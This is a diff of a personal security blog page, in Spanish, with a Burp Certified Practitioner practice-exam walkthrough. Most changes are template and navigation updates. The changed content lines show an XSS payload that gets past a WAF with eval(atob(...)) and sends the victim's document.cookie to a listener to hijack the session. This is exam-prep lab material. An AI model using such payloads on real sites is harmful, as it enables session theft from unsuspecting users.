@@ -12,7 +12,7 @@
   <title>Burp Certified Practitioner Practice Exam.</title>
 
   
-  <meta name="author" content="Qv1nTv5">
+  <meta name="author" content="German">
   
 
   <meta name="description" content="Practice Exam Burp Certified Practitioner.">
@@ -37,12 +37,12 @@
   
     
       
-  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
 
 
     
       
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
 
     
@@ -67,6 +67,10 @@
   
 
   
+    
+      <link rel="stylesheet" href="/assets/css/custom-dark.css">
+    
+  
 
   
   
@@ -83,7 +87,7 @@
 
   
   <meta property="og:type" content="article">
-  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:author" content="German">
   <meta property="og:article:published_time" content="2022-03-30T00:00:00-04:00">
   <meta property="og:url" content="http://localhost:4000/2022-03-30-PracticeExam/">
   <link rel="canonical" href="http://localhost:4000/2022-03-30-PracticeExam/">
@@ -102,6 +106,33 @@
 
   
 
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+    }
+  };
+
+  window.addEventListener('load', (event) => {
+    document.querySelectorAll("script[type='math/tex; mode=display']").forEach(function(el) {
+      el.outerHTML = "\\[" + el.textContent + "\\]";
+    });
+    document.querySelectorAll("script[type='math/tex']").forEach(function(el) {
+      el.outerHTML = "\\(" + el.textContent + "\\)";
+    });
+    var script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js';
+    script.async = true;
+    document.head.appendChild(script);
+  });
+</script>
+
 
   
 
@@ -115,22 +146,23 @@
   
 
 
-  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
     <span class="navbar-toggler-icon"></span>
   </button>
 
   <div class="collapse navbar-collapse" id="main-navbar">
-    <ul class="navbar-nav ml-auto">
+    <ul class="navbar-nav ms-auto">
           <li class="nav-item dropdown">
-            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
             <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                   <a class="dropdown-item" href="/Cpage">C</a>
                   <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+                  <a class="dropdown-item" href="/RUSTpage">Rust</a>
             </div>
           </li>
         
           <li class="nav-item dropdown">
-            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Web2</a>
             <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                   <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
                   <a class="dropdown-item" href="/THMpage">Thm</a>
@@ -140,6 +172,23 @@
                   <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
                   <a class="dropdown-item" href="/REDESpage">Net</a>
                   <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+                  <a class="dropdown-item" href="/CSOFTpage">MemCorrupt</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">ZKP</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/MATHpage">Math</a>
+                  <a class="dropdown-item" href="/RUSTpage">Rust</a>
+                  <a class="dropdown-item" href="/NOIRpage">Noir</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Assembly</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/ASSEMpage">x86</a>
             </div>
           </li>
         
@@ -170,9 +219,177 @@
     var searchjson = '[ \
        \
         { \
+          "title"    : "P vs NP.", \
+          "category" : "math", \
+          "url"      : "/2026-01-11-PvsNP/", \
+          "date"     : "January 11, 2026" \
+        }, \
+       \
+        { \
+          "title"    : "Race Conditions.", \
+          "category" : "csoft", \
+          "url"      : "/2025-12-28-RaceCondition/", \
+          "date"     : "December 28, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Introducción al Cálculo", \
+          "category" : "matemáticas", \
+          "url"      : "/2025-12-25-MathTest/", \
+          "date"     : "December 25, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Uninitialize Data Access.", \
+          "category" : "csoft", \
+          "url"      : "/2025-12-23-UDA/", \
+          "date"     : "December 23, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Control Flow.", \
+          "category" : "assem", \
+          "url"      : "/2025-12-12-ControlFlow/", \
+          "date"     : "December 12, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Other Integer Issues.", \
+          "category" : "csoft", \
+          "url"      : "/2025-12-05-OtherIntegerIssues/", \
+          "date"     : "December  5, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Integer Overflow/Underflow.", \
+          "category" : "csoft", \
+          "url"      : "/2025-12-05-IntegerOverflow-Underflow/", \
+          "date"     : "December  5, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Passing Parameters.", \
+          "category" : "assem", \
+          "url"      : "/2025-12-04-Passing-Parameters/", \
+          "date"     : "December  4, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Stackframe; Local variables, Arrays and Structures.", \
+          "category" : "assem", \
+          "url"      : "/2025-12-01-LocalVars_Arrays_structs/", \
+          "date"     : "December  1, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Out-Of-Bounds Write.", \
+          "category" : "csoft", \
+          "url"      : "/2025-11-26-Out-Of-Bounds-Write/", \
+          "date"     : "November 26, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Calling Functions.", \
+          "category" : "assem", \
+          "url"      : "/2025-11-21-CallingFunctions/", \
+          "date"     : "November 21, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "(Linear) Heap Buffer Overflow.", \
+          "category" : "csoft", \
+          "url"      : "/2025-11-18-HBO/", \
+          "date"     : "November 18, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Basic Instructions.", \
+          "category" : "assem", \
+          "url"      : "/2025-11-17-AssemblyBasicRegisters/", \
+          "date"     : "November 17, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Computer Registers.", \
+          "category" : "assem", \
+          "url"      : "/2025-11-08-ComputerRegisters/", \
+          "date"     : "November  8, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "CVE-2021-20294.", \
+          "category" : "csoft", \
+          "url"      : "/2025-11-07-CVE-2021-20294/", \
+          "date"     : "November  7, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "(Linear) Stack Buffer Overflow.", \
+          "category" : "csoft", \
+          "url"      : "/2025-11-06-LSBO/", \
+          "date"     : "November  6, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Text Editor.", \
+          "category" : "C", \
+          "url"      : "/2025-08-11-Text-Editor/", \
+          "date"     : "August 11, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Garbage Collector.", \
+          "category" : "C", \
+          "url"      : "/2025-07-11-GarbageCollector/", \
+          "date"     : "July 11, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Hashtables.", \
+          "category" : "C", \
+          "url"      : "/2025-06-13-HashTable/", \
+          "date"     : "June 13, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Building my own malloc in C.", \
+          "category" : "C", \
+          "url"      : "/2025-06-09-BuildingOwnMalloc/", \
+          "date"     : "June  9, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Malloc Tutorial", \
+          "category" : "C", \
+          "url"      : "/2025-06-06-MallocTutorial/", \
+          "date"     : "June  6, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "SharedLibraries&amp;FunctionHooking", \
+          "category" : "C", \
+          "url"      : "/2025-04-26-SharedLibraries&FunctionHooking/", \
+          "date"     : "April 26, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "File Descritors", \
+          "category" : "C", \
+          "url"      : "/2025-03-04-FileDescriptors/", \
+          "date"     : "March  4, 2025" \
+        }, \
+       \
+        { \
+          "title"    : "Network Programming", \
+          "category" : "C", \
+          "url"      : "/2025-02-22-Network_Programming/", \
+          "date"     : "February 22, 2025" \
+        }, \
+       \
+        { \
           "title"    : "2. Constants and Literals in C.", \
           "category" : "C", \
-          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "url"      : "/2024-12-10-2.ConstantsinC-copy/", \
           "date"     : "December 10, 2024" \
         }, \
        \
@@ -675,6 +892,13 @@
        \
        \
         { \
+          "title"    : "Assembly and Architecture Introduction.", \
+          "category" : "page", \
+          "url"      : "/ASSEMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
           "title"    : "Blueteam Basics", \
           "category" : "page", \
           "url"      : "/BLUETEAMBASICSpage/", \
@@ -689,7 +913,14 @@
         }, \
        \
         { \
-          "title"    : "C programming subjects.", \
+          "title"    : "C-Family Software Memory Corruption Vulnerabilities", \
+          "category" : "page", \
+          "url"      : "/CSOFTpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C &amp; Systems Fundamentals.", \
           "category" : "page", \
           "url"      : "/Cpage/", \
           "date"     : "January 1, 1970" \
@@ -720,6 +951,13 @@
           "title"    : "HackTheBox", \
           "category" : "page", \
           "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/MATHpage/", \
           "date"     : "January 1, 1970" \
         }, \
        \
@@ -773,7 +1011,7 @@
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/", \
           "date"     : "January 1, 1970" \
@@ -794,100 +1032,135 @@
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page2/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page3/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page4/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page5/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page6/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page7/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page8/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page9/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page10/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page11/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page12/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page13/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page14/", \
           "date"     : "January 1, 1970" \
         }, \
        \
         { \
-          "title"    : "Germán Sanmillán", \
+          "title"    : "", \
           "category" : "page", \
           "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/page16/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/page17/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/page18/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/page19/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/page20/", \
           "date"     : "January 1, 1970" \
         } \
        \
@@ -984,7 +1257,7 @@
 
 <p>Con esto lo que hacemos es cerrar el elemento mediante unas comillas y creamos otro separado por una coma cuyo nombre es “test” y cuyo valor es “alert(1)” y finalmente cerramos la estructura javascript y empleamos dos barras para comentar el resto del código. Da resultado con lo que se puede introducir código JavaScript. Ahora para mayor seguridad intentamos hacer que la página nos enseñe las cookies sin éxito debido a que el término “document.cookie” se bloquea mediante un WAF. Así por lo tanto, para evitar este bloqueo, podemos incluir un término encodeado que desencodeamos en el propio payload:</p>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;ciphertext&gt;</span><span class="dl">"</span><span class="p">))</span>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">eval</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;ciphertext&gt;</span><span class="dl">"</span><span class="p">))</span>
 </code></pre></div></div>
 
 <p>Con ‘eval’ provocaremos que el engine ejecute las funciones siguientes que se encuentren dentro del paréntesis. Con ‘atob’ decodificamos un string encodeado en base64. Así, si eval no es un término que se bloque en el navegador y si el servidor no lleva a cabo una validación del código nuestro payload codificado en base 64 se ejecutará en el navegador de la víctima. Para encodear en linux un texto en base64 empleamos:</p>
@@ -998,7 +1271,7 @@
 
 <p>De esta forma, construimos el siguiente código javascript:</p>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="s2">`http://127.0.0.1:8000/?cookie=</span><span class="p">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="s2">`http://127.0.0.1:8000/?cookie=</span><span class="p">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
 </code></pre></div></div>
 
 <p>Esto lo que hace es llevar a cabo una request a una dirección arbitraria con su propia cookie como parámetro en la request. Así, si hiciera una request a un servidor bajo nuestro control, podríamos revisarla mediante el log y obtener el valor del parámetro cookie que podríamos utilizar para robar la sesión. En este caso, vamos a emplear la dirección del servidor del exploit aunque se podría hacer con cualquier otro tipo de servidor.</p>
@@ -1259,7 +1532,7 @@
       <span class="sr-only">RSS</span>
     </a>
   </li><li class="list-inline-item">
-    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+    <a href="mailto:" title="Email me">
       <span class="fa-stack fa-lg" aria-hidden="true">
         <i class="fas fa-circle fa-stack-2x"></i>
         <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
@@ -1295,10 +1568,10 @@
       
       <p class="copyright text-muted">
       
-        Qv1nTv5
+        German
         &nbsp;&bull;&nbsp;
       
-      2024
+      2026
 
       
 
@@ -1317,17 +1590,7 @@
   
   
     
-  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
-
-
-  
-    
-  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
-
-
-  
-    
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
 
 
   
